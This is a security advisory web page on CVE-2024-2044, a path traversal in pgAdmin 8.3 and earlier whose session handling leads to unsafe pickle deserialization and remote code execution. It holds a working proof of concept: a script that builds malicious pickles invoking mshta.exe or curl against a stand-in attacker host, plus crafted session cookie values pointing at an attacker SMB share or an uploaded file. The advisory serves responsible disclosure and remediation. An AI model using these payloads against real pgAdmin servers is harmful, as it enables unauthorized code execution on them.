<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=description content="pgAdmin <= 8.3 is affected by a path-traversal vulnerability while deserializing user's session in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution."><meta name=Copyright content="Copyright &copy; Shielder"><meta property="og:title" content="Shielder - pgAdmin (<=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)"><meta property="og:type" content="article"><meta property="og:url" content="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/"><meta property="og:image" content="https://www.shielder.com//img/advisory.png"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="225"><meta property="og:image:height" content="225"><meta property="og:image:alt" content="advisory"><meta property="og:locale" content="en_US"><meta property="og:description" content="pgAdmin <= 8.3 is affected by a path-traversal vulnerability while deserializing user's session in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution."><meta property="og:site_name" content="Shielder"><meta property="fb:app_id" content="1651492201761174"><meta name=twitter:card content="summary"><meta name=twitter:site content="@ShielderSec"><meta name=twitter:creator content="@ShielderSec"><meta name=twitter:title content="Shielder - pgAdmin (<=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)"><meta name=twitter:description content="pgAdmin <= 8.3 is affected by a path-traversal vulnerability while deserializing user's session in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution."><meta name=twitter:image content="https://www.shielder.com//img/advisory.png"><link rel=apple-touch-icon sizes=57x57 href=https://www.shielder.com/favicon/apple-touch-icon-57x57.png><link rel=apple-touch-icon sizes=60x60 href=https://www.shielder.com/favicon/apple-touch-icon-60x60.png><link rel=apple-touch-icon sizes=72x72 href=https://www.shielder.com/favicon/apple-touch-icon-72x72.png><link rel=apple-touch-icon sizes=76x76 href=https://www.shielder.com/favicon/apple-touch-icon-76x76.png><link rel=apple-touch-icon sizes=114x114 href=https://www.shielder.com/favicon/apple-touch-icon-114x114.png><link rel=apple-touch-icon sizes=120x120 href=https://www.shielder.com/favicon/apple-touch-icon-120x120.png><link rel=apple-touch-icon sizes=144x144 href=https://www.shielder.com/favicon/apple-touch-icon-144x144.png><link rel=apple-touch-icon sizes=152x152 href=https://www.shielder.com/favicon/apple-touch-icon-152x152.png><link rel=apple-touch-icon sizes=167x167 href=https://www.shielder.com/favicon/apple-touch-icon-167x167.png><link rel=apple-touch-icon sizes=180x180 href=https://www.shielder.com/favicon/apple-touch-icon-180x180.png><link rel=icon type=image/png href=https://www.shielder.com/favicon/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=https://www.shielder.com/favicon/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=https://www.shielder.com/favicon/favicon-96x96.png sizes=96x96><link rel=icon type=image/png href=https://www.shielder.com/favicon/favicon-160x160.png sizes=160x160><link rel=icon type=image/png href=https://www.shielder.com/favicon/favicon-192x192.png sizes=192x192><link rel="shortcut icon" href=https://www.shielder.com/favicon/favicon.ico><link rel=preload href=https://www.shielder.com/fontawesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=https://www.shielder.com/fontawesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=https://www.shielder.com/fontawesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=https://www.shielder.com/fontawesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><title>Shielder - pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)
</title><link rel=stylesheet defer href=https://www.shielder.com/css/bootstrap.min.css><link rel=stylesheet defer href=https://www.shielder.com/css/style.css><link rel=stylesheet async href=https://www.shielder.com/fontawesome/css/all.min.css><link rel=stylesheet async href=https://www.shielder.com/css/dracula.css><link rel=alternate type=application/rss+xml title="Shielder Blog" href=https://www.shielder.com/blog/index.xml><link rel=alternate type=application/rss+xml title="Shielder Advisories" href=https://www.shielder.com/advisories/index.xml></head><body><nav class="navbar navbar-expand-lg fixed-top bg-primary p-3 px-md-5 px-lg-3 px-xl-5"><a class=navbar-brand href=https://www.shielder.com/ title=homepage><img src=https://www.shielder.com/img/logoshielder.svg alt="shielder logo homepage" class=w-75></a>
<button class="navbar-toggler text-white p-0" type=button data-toggle=collapse data-target=#navbarNav aria-controls=navbarNav aria-expanded=false aria-label="Toggle navigation">
<i class="fas fa-bars"></i></button><div class="collapse navbar-collapse justify-content-end pt-2" id=navbarNav><ul class=navbar-nav><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/ title=Home>Home</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/company title=Company>Company</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/services title=Services>Services</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/advisories title=Advisories>Advisories</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/blog title=Blog>Blog</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/careers title=Careers>Careers</a></li><li class="nav-item p-2"><a class="nav-link text-white" href=https://www.shielder.com/contacts title=Contacts>Contacts</a></li><li class="nav-item p-2"><button class="nav-link bg-transparent border-0 btn btn-primary dropdown-toggle rounded-0" type=button id=language-selector data-toggle=dropdown aria-haspopup=true aria-expanded=false>
ENG</button><div class="dropdown-menu dropdown-menu-right" aria-labelledby=language-selector><a class=dropdown-item href=https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/ title=ENG>ENG</a>
<a class=dropdown-item href=https://www.shielder.com/it/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/ title=ITA>ITA</a></div></li></ul></div></nav><section id=single-advisory class="bg-primary text-white"><div class=container><div class=row><div class="col-12 col-lg-8"><h1 id=pgadmin-83-path-traversal-in-session-handling-leads-to-unsafe-deserialization-and-remote-code-execution-rce>pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)</h1><h2 id=summary>Summary</h2><p>pgAdmin &lt;= 8.3 is affected by a path-traversal vulnerability while deserializing users&rsquo; sessions in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution.</p><h2 id=product-description-from-vendor>Product Description (from vendor)</h2><blockquote><p>&ldquo;pgAdmin is the most popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world. pgAdmin may be used on Linux, Unix, macOS and Windows to manage PostgreSQL and EDB Advanced Server 11 and above.&rdquo;. For more information visit <a href=https://www.pgadmin.org/ target=_blank rel="noopener noreferrer">https://www.pgadmin.org/</a>.</p></blockquote><h2 id=cves>CVE(s)</h2><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2044" target=_blank rel="noopener noreferrer">CVE-2024-2044</a></li></ul><h2 id=details>Details</h2><h3 id=root-cause-analysis>Root Cause Analysis</h3><p>pgAdmin4 uses a file-based session management approach. The session files are saved on disk as pickle objects. When a user performs a request, the value of the session cookie <code>pga4_session</code> is used to retrieve the file, then it&rsquo;s content is deserialized, and finally its signature verified.</p><p>The <code>ManagedSessionInterface</code> class implements flask&rsquo;s <code>SessionInterface</code> to read the user&rsquo;s cookie and translate it into their session:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>open_session</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>app</span><span class=p>,</span> <span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_val</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SESSION_COOKIE_NAME&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>cookie_val</span> <span class=ow>or</span> <span class=s1>&#39;!&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>cookie_val</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>manager</span><span class=o>.</span><span class=n>new_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>sid</span><span class=p>,</span> <span class=n>digest</span> <span class=o>=</span> <span class=n>cookie_val</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;!&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>manager</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>sid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>manager</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>sid</span><span class=p>,</span> <span class=n>digest</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>manager</span><span class=o>.</span><span class=n>new_session</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>The cookie value is split in 2 parts at the first <code>!</code> character. The first part is the session ID (<code>sid</code>), while the second is the session digest.</p><p>The vulnerability lies in the <code>FileBackedSessionManager.get</code> method that loads session files by concatenating the <code>sessions</code> folder - located inside the pgAdmin4 <code>DATA_DIR</code> - with the session ID. Precisely, the two values are concatenated using the <a href=https://docs.python.org/3/library/os.path.html#os.path.join target=_blank rel="noopener noreferrer"><code>os.path.join</code></a> function.</p><p>This function has two weaknesses:</p><ul><li>It does not set a trusted base-path which should not be escaped, therefore <code>os.path.join("/opt/safe/", "../../etc/passwd")</code> returns <code>/etc/passwd</code>.</li><li>It uses the right-most absolute path in its arguments as the root path, therefore <code>os.path.join("./safe/", "do_not_escape_from_here", "/etc/passwd")</code> returns <code>/etc/passwd</code>.</li></ul><p>The following snippet shows the vulnerable code, with added comments:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>sid</span><span class=p>,</span> <span class=n>digest</span><span class=p>):</span> <span class=c1># sid and digest are read from the cookie, therefore user-controllable</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Retrieve a managed session by session-id, checking the HMAC digest&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fname</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>sid</span><span class=p>)</span> <span class=c1># &lt;-- by controlling the sid we can force os.path.join into returning an arbitrary absolute path</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>hmac_digest</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>randval</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>fname</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>fname</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span> <span class=c1># &lt;-- open will read a file from the absolute path</span>
</span></span><span class=line><span class=cl>                <span class=n>randval</span><span class=p>,</span> <span class=n>hmac_digest</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span> <span class=c1># &lt;-- load is pickle.load, the deserialization entry-point</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=c1># ...SNIP...</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=proof-of-concept>Proof of Concept</h3><p><strong>Initial Setup</strong></p><ol><li>Expose a SMB server on a public-facing host:<ol><li>Install impacket with: <code>python3 -m pipx install impacket</code></li><li>Download the <a href=https://github.com/fortra/impacket/raw/337d50d04e191c2b323ccf4877500fc487126dd1/examples/smbserver.py target=_blank rel="noopener noreferrer"><code>smbserver.py</code> example</a></li><li>Expose the <code>/tmp</code> folder as <code>share</code>: <code>python3 smbserver.py -smb2support share /tmp</code></li></ol></li><li>Expose an HTTP server on a public-facing host.</li><li>Save the following snippet of code and run it with <code>python3 pickler.py '&lt;attacker_host>'</code> replacing <code>&lt;attacker_host></code> with the IP/domain of the HTTP server setup at step 2 to create two serializaed object, one for Windows (<code>nt.pickle</code>) and one for Linux/POSIX (<code>posix.pickle</code>) which will perform an HTTP request to the <code>&lt;attacker_host></code> when deserialized.</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>produce_pickle_bytes</span><span class=p>(</span><span class=n>platform</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x80\x04\x95</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;L&#39;</span><span class=p>,</span> <span class=mi>22</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>platform</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>cmd</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x8c</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>platform</span><span class=p>))</span> <span class=o>+</span> <span class=n>platform</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x94\x8c\x06</span><span class=s1>system</span><span class=se>\x94\x93\x94</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x8c</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>cmd</span><span class=p>))</span> <span class=o>+</span> <span class=n>cmd</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x94\x85\x94</span><span class=s1>R</span><span class=se>\x94</span><span class=s1>.&#39;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;usage: </span><span class=si>{</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s2> ip:port&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;nt.pickle&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>produce_pickle_bytes</span><span class=p>(</span><span class=s1>&#39;nt&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;mshta.exe http://</span><span class=si>{</span><span class=n>HOST</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;posix.pickle&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>produce_pickle_bytes</span><span class=p>(</span><span class=s1>&#39;posix&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;curl http://</span><span class=si>{</span><span class=n>HOST</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Windows</strong></p><ol><li>Expose the <code>nt.pickle</code> file using the SMB share</li><li>Deploy a pgAdmin4 server on Windows</li><li>Visit the pgAdmin4 login page</li><li>Open the browser&rsquo;s developer tools and change the <code>pga4_session</code> cookie value to <code>//&lt;attacker_host>/share/nt.pickle!a</code> replacing <code>&lt;attacker_host></code> with the SMB server&rsquo;s IP/domain</li><li>Notice that the <code>nt.pickle</code> file is retrieved from the SMB share</li><li>Notice that an HTTP request is performed to the HTTP server, confirming the code execution</li></ol><p><strong>Linux/POSIX</strong></p><ol><li>Deploy a pgAdmin4 server on Linux</li><li>Login with a valid user account</li><li>Visit the <strong>Storage Manager</strong> component</li><li>Upload the <code>posix.pickle</code> file</li><li>Open the browser&rsquo;s developer tools and change the <code>pga4_session</code> cookie value to <code>../storage/&lt;email>/posix.pickle!a</code> replacing <code>&lt;email></code> with the currently logged in user&rsquo;s email after replacing <code>@</code> with <code>_</code></li><li>Notice that an HTTP request is performed to the HTTP server, confirming the code execution</li></ol><h3 id=impact>Impact</h3><p>An attacker could force the server into deserializing a pickle object at an arbitrary path. This type of deserialization can be used to run arbitrary code.</p><p>The requirements to exploit the vulnerability vary based on the operating system of the host where pgAdmin4 is installed:</p><ul><li>Windows: the attacker could specify in the cookie a UNC path (i.e. <code>//attacker.com/share/file.pickle</code>) and expose an unauthenticated SMB share to serve the malicious pickle object, turning the vulnerability into a pre-authentication one.</li><li>Linux/POSIX: the attacker must be able to upload the malicious pickle object on the host, this could be done using the pgAdmin4 <strong>Storage Manager</strong> component, which requires the attacker to have a valid account on the target pgAdmin4 instance.</li></ul><h3 id=remediation>Remediation</h3><p>Upgrade to <a href=https://www.pgadmin.org/docs/pgadmin4/8.4/index.html target=_blank rel="noopener noreferrer">pgAdmin 8.4</a> or later.</p><h2 id=disclosure-timeline>Disclosure Timeline</h2><p>This report was subject to Shielder&rsquo;s <a href=https://www.shielder.com/disclosure-policy target=_blank rel="noopener noreferrer">disclosure policy</a>:</p><ul><li>26/02/2024:<ul><li>First contact with pgAdmin Security Team.</li></ul></li><li>27/02/2024:<ul><li>Full Report sent via mail to pgAdmin Security Team.</li><li>pgAdmin Security Team acknowledges the vulnerability and starts working on a fix.</li></ul></li><li>27/02/2024:<ul><li>pgAdmin Team proposes a patch.</li><li>Shielder suggests changes to the proposed patch.</li></ul></li><li>27/02/2024:<ul><li>pgAdmin Team proposes a new improved patch.</li><li>Shielder acknowledges the new patch.</li></ul></li><li>04/03/2024:<ul><li>pgAdmin Team <a href=https://github.com/pgadmin-org/pgadmin4/issues/7258 target=_blank rel="noopener noreferrer">opens an issue on Github</a>.</li><li>pgAdmin Team <a href=https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d target=_blank rel="noopener noreferrer">releases a patch on Github</a>.</li><li>pgAdmin Team releases full vulnerability details.</li><li>PostgreSQL CNA reserves CVE-2024-2044.</li></ul></li><li>07/03/2024:<ul><li><a href=https://github.com/pgadmin-org/pgadmin4/releases/tag/REL-8_4 target=_blank rel="noopener noreferrer">pgAdmin 8.4</a> is released.</li></ul></li><li>08/03/2024:<ul><li>Shielder&rsquo;s advisory is made public.</li></ul></li></ul><h2 id=credits>Credits</h2><ul><li>Davide `<a href=https://thezero.org target=_blank rel="noopener noreferrer">TheZero</a>` Silvetti of Shielder</li><li>Abdel Adim `<a href=https://twitter.com/smaury92 target=_blank rel="noopener noreferrer">smaury</a>` Oisfi of Shielder</li></ul><p class="font-weight-bold smaller mt-4">This advisory was first published on https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</p></div><div class="col-12 col-lg-3 offset-lg-1 order-first order-lg-last mb-5 mb-lg-0"><div class=row><div class="col-12 my-4"><p class=mb-0><i class="fas fa-folder text-primary pr-2"></i>
<span class="badge badge-pill border text-muted border-primary text-uppercase mb-2 mr-1"><a class="smaller text-decoration-none text-muted" href=/types/advisory>Advisory</a></span></p></div><div class="col-12 mb-4"><p class="text-muted text-uppercase smaller mb-1">Date</p><p class="font-weight-bold text-uppercase mb-0">8 March 2024</p></div></div></div></div></div></section><footer class="pt-5 pb-4 px-3 px-md-0"><div class=container><div class="row text-center"><div class="col-12 col-lg-4 text-white border-bottom mb-4 pb-lg-0 mb-lg-0"><p class="text-uppercase font-weight-bold">Info</p><p class=footer-info>Shielder S.p.A.</p><p class=footer-info>P.I. 11435310013</p><p class=footer-info>REA TO - 1213132</p><p class=footer-info>Registered Capital: 81.000,00 â¬</p><p><a class="text-decoration-none text-white" target=_blank rel=noopener href="https://www.google.it/maps/place/Shielder/@44.8833849,7.3303863,17z/data=!3m1!4b1!4m5!3m4!1s0x4788250440849fa5:0x74cf10f2092abc85!8m2!3d44.8833849!4d7.332575" title="corporate headquarters">Via
Palestro, 1/C<br>10064 Pinerolo (TO) Italy</a></p><div class="iso-logos row justify-content-center mb-4 pb-lg-0 mb-lg-0"><div class=col-3><img alt=ISO27001 src=/img/iso27001.png></div><div class=col-3><img alt=ISO9001 src=/img/iso9001.png></div></div></div><div class="col-12 col-lg-4 text-white border-bottom mb-4 pb-lg-0 mb-lg-0"><p class="text-uppercase font-weight-bold">Contacts</p><p class=footer-contact><a class="text-decoration-none text-white" href=mailto:info@shielder.com title="email Shielder">info@shielder.com</a></p><p class=footer-contact>Landline:
<a class="text-decoration-none text-white" href=tel:+390121393642 title=Landline>(+39) 0121 - 39 36 42</a></p><p class=footer-contact>Commercial:
<a class="text-decoration-none text-white" href=tel:+393453031983 title=Commercial>(+39) 345 - 30 31 983</a></p><p class=footer-contact>Technical:
<a class="text-decoration-none text-white" href=tel:+393931666814 title=Technical>(+39) 393 - 16 66 814</a></p><p><span><a href=https://twitter.com/ShielderSec title="Shielder Twitter profile" target=_blank rel="noopener me" class=text-white><i class="fab fa-x-twitter bigger-icon"></i></a>
</span><span class=pl-3><a href=https://infosec.exchange/@Shielder title="Shielder Mastodon profile" target=_blank rel="noopener me" class=text-white><i class="fab fa-mastodon bigger-icon"></i></a>
</span><span class=px-3><a href=https://www.linkedin.com/company/shielder title="Shielder LinkedIn profile" target=_blank rel="noopener me" class=text-white><i class="fab fa-linkedin bigger-icon"></i></a>
</span><span><a href=https://github.com/shieldersec title="Shielder Github profile" target=_blank rel="noopener me" class=text-white><i class="fab fa-github bigger-icon"></i></a></span></p></div><div class="col-12 col-lg-4 text-white mb-4 pb-lg-0 mb-lg-0"><p class="text-uppercase font-weight-bold">Sitemap</p><p><a class="text-decoration-none text-white" title=Home href=https://www.shielder.com/>Home</a></p><p><a class="text-decoration-none text-white" title=Company href=https://www.shielder.com/company>Company</a></p><p><a class="text-decoration-none text-white" title=Services href=https://www.shielder.com/services>Services</a></p><p><a class="text-decoration-none text-white" title=Advisories href=https://www.shielder.com/advisories>Advisories</a></p><p><a class="text-decoration-none text-white" title=Blog href=https://www.shielder.com/blog>Blog</a></p><p><a class="text-decoration-none text-white" title=Careers href=https://www.shielder.com/careers>Careers</a></p><p><a class="text-decoration-none text-white" title=Contacts href=https://www.shielder.com/contacts>Contacts</a></p></div><div class="col-12 mt-5"><span class="mb-2 mb-lg-0 border-md-right pr-2 text-white d-block d-lg-inline">Copyright Â© Shielder 2014 - 2024</span>
<span class="mb-2 mb-lg-0 border-md-right pr-2 pl-1 text-white d-block d-lg-inline"><a class="text-decoration-none text-white" href=/disclosure-policy title="Disclosure Policy">Disclosure policy</a></span>
<span class="mb-2 mb-lg-0 pr-2 pl-1 text-white d-block d-lg-inline"><a class="text-decoration-none text-white" href=/privacy-policy title="Privacy Policy">Privacy policy</a></span></div></div></div></footer><script src=https://www.shielder.com/js/jquery.min.js></script><script src=https://www.shielder.com/js/app.js></script><script src=https://www.shielder.com/js/bootstrap.bundle.min.js></script></body></html>